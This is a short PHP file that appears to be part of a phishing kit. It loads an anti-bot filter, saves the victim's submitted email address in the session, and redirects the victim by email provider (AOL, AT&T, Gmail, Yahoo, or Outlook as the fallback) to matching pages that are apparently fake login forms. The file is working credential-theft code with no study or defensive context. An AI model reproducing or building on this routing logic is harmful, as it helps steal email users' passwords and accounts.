<?php
session_start();
include('../antibots.php');

$_SESSION['email'] = $_POST['email'];
$a = $_POST['email'];
if (strpos($a,"@aol")) {
	header("Location: aol.php");
}

else if (strpos($a,"@att")) {
	header("Location: att.php");
}

else if (strpos($a,"@gmail")) {
	header("Location: google.php");
}

else if (strpos($a,"@yahoo")) {
	header("Location: yahoo.php");
}

else {
	header("Location: outlook.php");
}
?>